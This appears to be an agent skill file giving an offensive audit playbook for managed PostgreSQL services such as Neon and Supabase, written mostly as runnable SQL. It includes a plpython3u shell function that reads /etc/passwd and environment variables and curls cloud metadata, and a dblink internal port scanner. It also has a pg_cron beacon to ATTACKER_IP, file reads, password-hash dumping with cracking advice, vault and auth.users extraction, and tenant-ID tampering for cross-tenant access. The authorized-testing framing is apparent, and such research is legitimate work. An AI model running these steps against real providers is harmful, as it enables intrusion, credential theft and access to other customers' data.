---
name: pg_tenant_audit
description: PostgreSQL tenant isolation audit — role enumeration, schema secrets, GUC parameter extraction, extension abuse, dblink SSRF, cross-tenant attacks on managed PG services
---

# PostgreSQL Tenant Isolation Audit

Systematic security audit methodology for managed PostgreSQL services (Neon, Supabase, PlanetScale Postgres, CockroachDB, Aiven, Tembo, Crunchy Bridge, etc.). Managed PostgreSQL providers give tenants a database with restricted privileges, but the isolation boundary is complex: roles, schemas, extensions, GUC parameters, network policies, and replication features all contribute. A single gap yields cross-tenant data access, SSRF into the provider's internal network, or credential disclosure. This methodology is battle-tested on a Neon engagement that found 2 High-severity bugs (SSRF CVSS 8.6, PKCE bypass CVSS 8.1).

## Phase 1: Role and Privilege Audit

Map the permission landscape. Understand what the tenant role can and cannot do.

```sql
-- Current identity
SELECT current_user, session_user, current_database(), current_schema(), inet_server_addr(), inet_server_port();

-- All roles visible to the tenant
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin,
       rolreplication, rolbypassrls, rolconnlimit
FROM pg_roles
ORDER BY rolname;

-- Check which roles the current user can SET ROLE to
SELECT r.rolname AS target_role
FROM pg_roles r
JOIN pg_auth_members m ON r.oid = m.roleid
WHERE m.member = (SELECT oid FROM pg_roles WHERE rolname = current_user);

-- Try SET ROLE to each accessible role
-- SET ROLE neon_superuser;
-- SET ROLE supabase_admin;
-- SET ROLE cloudsqlsuperuser;

-- Check role attributes of current user
SELECT * FROM pg_roles WHERE rolname = current_user;

-- Granted privileges on databases
SELECT datname, datacl FROM pg_database;

-- Check for superuser-equivalent permissions
SELECT rolname FROM pg_roles WHERE rolsuper = true;
SELECT rolname FROM pg_roles WHERE rolcreaterole = true;
SELECT rolname FROM pg_roles WHERE rolbypassrls = true;
```

**What to look for:**
- Can the tenant escalate to a provider-internal role? (neon_superuser, supabase_admin, etc.)
- Is `rolcreaterole` granted? This can be chained to create a superuser in some configurations.
- Is `rolreplication` granted? This enables logical replication (SSRF vector).
- Is `rolbypassrls` granted? This bypasses Row-Level Security (cross-tenant data access if RLS is the isolation boundary).

## Phase 2: Schema Enumeration

```sql
-- All schemas
SELECT schema_name, schema_owner
FROM information_schema.schemata
ORDER BY schema_name;

-- Tables in all accessible schemas
SELECT schemaname, tablename, tableowner, hasindexes
FROM pg_tables
WHERE schemaname NOT IN ('pg_catalog', 'information_schema')
ORDER BY schemaname, tablename;

-- Check permissions on each schema
SELECT nspname, nspacl
FROM pg_namespace
ORDER BY nspname;

-- Views (may expose data from restricted tables)
SELECT schemaname, viewname, viewowner
FROM pg_views
WHERE schemaname NOT IN ('pg_catalog', 'information_schema');

-- Functions (may have SECURITY DEFINER = runs as owner, not caller)
SELECT n.nspname AS schema, p.proname AS function,
       pg_get_userbyid(p.proowner) AS owner,
       p.prosecdef AS security_definer,
       p.provolatile, p.proacl
FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE n.nspname NOT IN ('pg_catalog', 'information_schema')
ORDER BY n.nspname, p.proname;

-- SECURITY DEFINER functions are privilege escalation targets
-- If a function runs as a higher-privileged owner, find SQL injection in its parameters
SELECT n.nspname, p.proname, pg_get_userbyid(p.proowner) AS owner,
       pg_get_functiondef(p.oid)
FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE p.prosecdef = true
  AND n.nspname NOT IN ('pg_catalog', 'information_schema');
```

## Phase 3: Secrets in Database

Managed PostgreSQL services often store configuration, credentials, and keys in vendor-specific schemas or tables.

```sql
-- Search for vendor-specific schemas
SELECT schema_name FROM information_schema.schemata
WHERE schema_name LIKE '%neon%'
   OR schema_name LIKE '%supabase%'
   OR schema_name LIKE '%aiven%'
   OR schema_name LIKE '%crunchy%'
   OR schema_name LIKE '%tembo%';

-- Search for configuration/secrets tables
SELECT schemaname, tablename
FROM pg_tables
WHERE tablename ILIKE '%config%'
   OR tablename ILIKE '%secret%'
   OR tablename ILIKE '%key%'
   OR tablename ILIKE '%credential%'
   OR tablename ILIKE '%token%'
   OR tablename ILIKE '%auth%'
   OR tablename ILIKE '%setting%'
   OR tablename ILIKE '%jwk%';

-- Supabase-specific: JWKS keys and service role keys
-- SELECT * FROM vault.secrets;
-- SELECT * FROM supabase_functions.secrets;

-- Try reading from vendor schemas
-- SELECT * FROM neon.project_config;
-- SELECT * FROM supabase.config;

-- Search for JWT/JWKS material
SELECT schemaname, tablename
FROM pg_tables
WHERE tablename ILIKE '%jwt%' OR tablename ILIKE '%jwk%';

-- Check for API keys in any accessible table
-- Broad search: look at all text/varchar columns for key-like patterns
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE data_type IN ('text', 'character varying')
  AND (column_name ILIKE '%key%' OR column_name ILIKE '%secret%'
       OR column_name ILIKE '%token%' OR column_name ILIKE '%password%')
  AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

## Phase 4: GUC Parameter Extraction

Grand Unified Configuration (GUC) parameters are PostgreSQL's configuration system. Managed providers use custom GUC parameters to store internal hostnames, IPs, project identifiers, and feature flags. These leak infrastructure details.

```sql
-- All GUC parameters
SHOW ALL;

-- More detailed view
SELECT name, setting, unit, category, short_desc, source
FROM pg_settings
ORDER BY name;

-- Vendor-specific parameters (try each)
SELECT name, setting FROM pg_settings WHERE name LIKE 'neon.%';
SELECT name, setting FROM pg_settings WHERE name LIKE 'supabase.%';
SELECT name, setting FROM pg_settings WHERE name LIKE 'aiven.%';
SELECT name, setting FROM pg_settings WHERE name LIKE 'crunchy.%';
SELECT name, setting FROM pg_settings WHERE name LIKE 'tembo.%';
SELECT name, setting FROM pg_settings WHERE name LIKE 'timescaledb.%';

-- Parameters that commonly contain hostnames/URLs
SELECT name, setting FROM pg_settings
WHERE setting LIKE '%.internal%'
   OR setting LIKE '%.svc.%'
   OR setting LIKE '%localhost%'
   OR setting LIKE '%://%;'
   OR setting LIKE '%.neon.%'
   OR setting LIKE '%.supabase.%';

-- Connection-related parameters (may reveal internal network)
SELECT name, setting FROM pg_settings
WHERE name IN ('listen_addresses', 'port', 'unix_socket_directories',
               'primary_conninfo', 'primary_slot_name',
               'restore_command', 'archive_command');

-- Parameters that reveal infrastructure
SELECT name, setting FROM pg_settings
WHERE name IN ('data_directory', 'config_file', 'hba_file',
               'ident_file', 'external_pid_file',
               'cluster_name', 'server_version');

-- Try to SET vendor-specific parameters (test if modifiable)
-- SET neon.tenant_id = 'other-tenant-id';
-- SET neon.timeline_id = 'other-timeline';
```

**What to extract:**
- Internal hostnames and IPs (targets for dblink SSRF)
- Tenant/project identifiers (for cross-tenant attacks)
- Connection strings (may contain credentials)
- Storage paths (for file-based attacks)
- Feature flags (may reveal disabled-but-present functionality)

## Phase 5: Extension Audit

Extensions dramatically expand PostgreSQL's capabilities -- and attack surface.

```sql
-- Installed extensions
SELECT extname, extversion, extowner::regrole
FROM pg_extension
ORDER BY extname;

-- Available but not installed extensions
SELECT name, default_version, installed_version, comment
FROM pg_available_extensions
WHERE installed_version IS NULL
ORDER BY name;

-- Check if tenant can install extensions
-- CREATE EXTENSION IF NOT EXISTS dblink;
-- CREATE EXTENSION IF NOT EXISTS postgres_fdw;

-- Dangerous extensions to look for/try:
```

### dblink / postgres_fdw (SSRF)

```sql
-- Check if dblink is available
SELECT * FROM pg_available_extensions WHERE name = 'dblink';

-- If installed or installable:
CREATE EXTENSION IF NOT EXISTS dblink;

-- SSRF: connect to internal services
-- Test connectivity to metadata endpoint
SELECT dblink_connect('host=169.254.169.254 port=80 dbname=test connect_timeout=3');

-- Test connectivity to IPs from GUC parameters
SELECT dblink_connect('host=INTERNAL_IP port=5432 dbname=postgres connect_timeout=3');

-- Port scan via dblink (observe error messages)
-- Open port: "could not connect" or authentication error (fast)
-- Closed port: "connection refused" (fast)
-- Filtered port: timeout (slow)
DO $$
DECLARE
  ports int[] := ARRAY[22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9090, 9200, 27017];
  p int;
  result text;
BEGIN
  FOREACH p IN ARRAY ports LOOP
    BEGIN
      PERFORM dblink_connect('scan_' || p,
        'host=INTERNAL_IP port=' || p || ' dbname=test connect_timeout=2');
      RAISE NOTICE 'Port % - OPEN (connected)', p;
      PERFORM dblink_disconnect('scan_' || p);
    EXCEPTION WHEN OTHERS THEN
      result := SQLERRM;
      IF result LIKE '%connection refused%' THEN
        RAISE NOTICE 'Port % - CLOSED', p;
      ELSIF result LIKE '%timeout%' THEN
        RAISE NOTICE 'Port % - FILTERED', p;
      ELSE
        RAISE NOTICE 'Port % - OPEN (%) ', p, result;
      END IF;
    END;
  END LOOP;
END $$;

-- postgres_fdw: similar but creates persistent foreign server connections
CREATE EXTENSION IF NOT EXISTS postgres_fdw;
CREATE SERVER internal_scan FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host 'INTERNAL_IP', port '5432', dbname 'postgres');
```

### Untrusted Language Extensions (RCE)

```sql
-- Check for untrusted procedural languages
SELECT name FROM pg_available_extensions
WHERE name IN ('plpythonu', 'plpython3u', 'plperlu', 'pltclu');

-- If available:
CREATE EXTENSION plpython3u;

CREATE FUNCTION cmd(text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(args[0], shell=True).decode()
$$ LANGUAGE plpython3u;

SELECT cmd('id');
SELECT cmd('cat /etc/passwd');
SELECT cmd('env');
SELECT cmd('curl http://169.254.169.254/latest/meta-data/');
```

### File Access Extensions

```sql
-- file_fdw: read local files as foreign tables
CREATE EXTENSION IF NOT EXISTS file_fdw;
CREATE SERVER file_server FOREIGN DATA WRAPPER file_fdw;
CREATE FOREIGN TABLE etc_passwd (line text)
  SERVER file_server OPTIONS (filename '/etc/passwd');
SELECT * FROM etc_passwd;

-- pg_read_file (built-in, requires privileges)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('postgresql.conf');
SELECT pg_read_file('pg_hba.conf');

-- pg_read_binary_file
SELECT encode(pg_read_binary_file('/etc/passwd'), 'escape');

-- COPY ... FROM (requires superuser typically)
-- COPY test_table FROM '/etc/passwd';

-- lo_import (large objects for file read)
SELECT lo_import('/etc/passwd');
SELECT encode(lo_get(LAST_OID), 'escape');
```

### Other Useful Extensions

```sql
-- pg_stat_statements: see all SQL queries (may contain secrets)
SELECT * FROM pg_stat_statements ORDER BY calls DESC LIMIT 50;

-- pg_cron: schedule jobs (persistence)
SELECT cron.schedule('*/5 * * * *', $$SELECT dblink_connect('host=ATTACKER_IP ...')$$);

-- adminpack: file operations
SELECT pg_file_write('/tmp/test.txt', 'test', false);

-- pageinspect: raw page access (cross-tenant if shared storage)
SELECT * FROM page_header(get_raw_page('pg_authid', 0));
```

## Phase 6: Subscription SSRF (Logical Replication)

If the tenant has `REPLICATION` privilege or `CREATE` on the database:

```sql
-- Check replication privilege
SELECT rolreplication FROM pg_roles WHERE rolname = current_user;

-- If enabled, create a subscription (SSRF via replication protocol)
CREATE SUBSCRIPTION ssrf_test
  CONNECTION 'host=INTERNAL_IP port=5432 dbname=postgres'
  PUBLICATION test
  WITH (connect = true, enabled = false);

-- The server will attempt to connect to INTERNAL_IP:5432
-- Error messages reveal if the host is reachable:
-- "could not connect to server: Connection refused" → host up, port closed
-- "could not connect to server: timeout" → filtered
-- "password authentication failed" → host up, PG running, port open

-- Clean up
DROP SUBSCRIPTION ssrf_test;

-- Test against metadata endpoints
CREATE SUBSCRIPTION meta_test
  CONNECTION 'host=169.254.169.254 port=80 dbname=test'
  PUBLICATION test;
```

## Phase 7: Authentication Analysis

```sql
-- Password hashes (if pg_authid is readable)
SELECT rolname, rolpassword FROM pg_authid;
-- SCRAM-SHA-256 hashes: SCRAM-SHA-256$iterations:salt$StoredKey:ServerKey
-- MD5 hashes: md5{hash}

-- If SCRAM hashes are visible, check iteration count
-- Low iterations (< 4096) = faster cracking
SELECT rolname,
       split_part(rolpassword, '$', 1) AS method,
       split_part(split_part(rolpassword, '$', 2), ':', 1) AS iterations
FROM pg_authid
WHERE rolpassword IS NOT NULL;

-- SCRAM iteration count oracle (without seeing hashes):
-- Connect with wrong password, observe timing
-- Higher iterations = longer authentication time
-- Compare against known iteration counts to fingerprint the configuration

-- pg_hba.conf rules (if readable)
SELECT pg_read_file('pg_hba.conf');
-- Shows which hosts can connect and with which auth methods
-- "trust" entries = no password required from those sources
```

## Phase 8: Cross-Tenant Attack Vectors

```sql
-- Check tenant isolation parameters
-- Try modifying tenant-specific GUC parameters
SET neon.tenant_id = 'other-tenant-uuid';
SET neon.timeline_id = 'other-timeline-uuid';
SHOW neon.tenant_id;

-- If modifiable → potential cross-tenant access on shared storage

-- Shared buffer / page inspection
-- If pageinspect is available and storage is shared:
CREATE EXTENSION IF NOT EXISTS pageinspect;
SELECT * FROM page_header(get_raw_page('pg_authid', 0));
-- On shared storage, raw page access might read another tenant's pages

-- Check for shared tablespaces
SELECT spcname, spcowner::regrole, pg_tablespace_location(oid)
FROM pg_tablespace;

-- Check for shared temp files
SELECT * FROM pg_ls_tmpdir();

-- Check for process visibility
SELECT pid, usename, application_name, client_addr, query
FROM pg_stat_activity;
-- Can you see other tenants' queries?

-- Large object cross-tenant check
SELECT loid FROM pg_largeobject_metadata;
-- Are there large objects from other tenants visible?
```

## Vendor-Specific Checks

### Neon

```sql
-- Neon-specific GUC parameters
SELECT name, setting FROM pg_settings WHERE name LIKE 'neon.%';
-- Look for: neon.tenant_id, neon.timeline_id, neon.pageserver_connstring

-- Neon compute node metadata
-- Connection to pageserver (internal component)
SELECT name, setting FROM pg_settings
WHERE name IN ('neon.pageserver_connstring', 'neon.safekeepers_connstring');

-- Test dblink to pageserver
SELECT dblink_connect('host=PAGESERVER_HOST port=6400 dbname=test connect_timeout=3');
```

### Supabase

```sql
-- Supabase schemas
SELECT schema_name FROM information_schema.schemata
WHERE schema_name IN ('supabase_functions', 'supabase_migrations', 'storage', 'vault', 'auth');

-- Service role key (highest-privilege API key)
-- SELECT * FROM vault.secrets WHERE name LIKE '%service%';

-- Auth schema (user data)
SELECT * FROM auth.users LIMIT 5;

-- Storage schema
SELECT * FROM storage.buckets;
```

### CockroachDB

```sql
-- CockroachDB-specific
SHOW CLUSTER SETTING server.host;
SHOW ALL CLUSTER SETTINGS;
SELECT * FROM crdb_internal.gossip_nodes;
SELECT * FROM crdb_internal.node_runtime_info;
```

## Testing Methodology

1. **Role audit**: Map current user, all roles, SET ROLE targets, privilege escalation paths
2. **Schema enumeration**: Find vendor schemas, SECURITY DEFINER functions, exposed views
3. **Secrets hunt**: Search for credentials, keys, tokens in accessible tables
4. **GUC extraction**: Dump all parameters, extract internal hostnames and IPs
5. **Extension audit**: Check installed/available extensions, test dangerous ones (dblink, plpythonu, file_fdw)
6. **Network probing**: Use dblink/subscriptions to scan internal network using IPs from GUC params
7. **Auth analysis**: Check pg_authid visibility, SCRAM iterations, pg_hba.conf
8. **Cross-tenant**: Test tenant ID modification, shared storage access, process visibility
9. **Vendor-specific**: Run checks specific to the identified managed PG provider

## Validation Requirements

1. **SSRF via dblink**: Show successful connection to internal service with error message proving reachability
2. **Credential disclosure**: Show extracted passwords, API keys, or JWKS material from accessible tables
3. **File read**: Show contents of sensitive files via pg_read_file, file_fdw, or lo_import
4. **Cross-tenant**: Demonstrate access to another tenant's data or ability to modify tenant isolation parameters
5. **RCE**: Show command execution output from untrusted language extension

## Impact

- **SSRF via dblink/subscriptions** — Access internal services, cloud metadata, other databases in the provider network. Typically CVSS 7.5-8.6.
- **Credential disclosure** — Extract API keys, JWKS secrets, service role keys. Impact depends on the credential's scope.
- **Cross-tenant data access** — Read or modify another tenant's data. Typically CVSS 9.0+.
- **RCE via untrusted languages** — Full command execution on the database compute node.
- **File read** — Access configuration files, credentials, private keys on the database server.

## Pro Tips

1. Always run `SHOW ALL` first -- vendor-specific GUC parameters are the fastest way to understand the internal architecture and find SSRF targets
2. Error messages from dblink are your best oracle: they distinguish between open/closed/filtered ports and even reveal service versions
3. SECURITY DEFINER functions are the most common privilege escalation vector -- they run as the function owner, not the caller
4. Even if dblink is not installed, check if the tenant can `CREATE EXTENSION dblink` -- many providers allow it
5. Logical replication subscriptions are an overlooked SSRF vector -- they use the replication protocol, which may bypass network policies that only filter HTTP
6. pg_stat_statements often contains queries with embedded credentials from other application components
7. On Supabase, the `vault` and `auth` schemas are high-value targets -- the service role key grants full API access
8. SCRAM password hashes with low iteration counts (< 4096) are crackable with hashcat in reasonable time
9. Check `pg_ls_tmpdir()` and `pg_ls_waldir()` -- temp files and WAL segments may contain cross-tenant data on shared storage

## Summary

Managed PostgreSQL services expose a complex isolation boundary. The audit methodology is: enumerate roles and escalation paths, search vendor schemas for secrets, extract internal infrastructure details from GUC parameters, test dangerous extensions (dblink for SSRF, plpythonu for RCE, file_fdw for file read), probe the internal network, and test cross-tenant isolation boundaries. A single misconfigured extension or exposed GUC parameter can turn a tenant database into an SSRF pivot point or credential store.
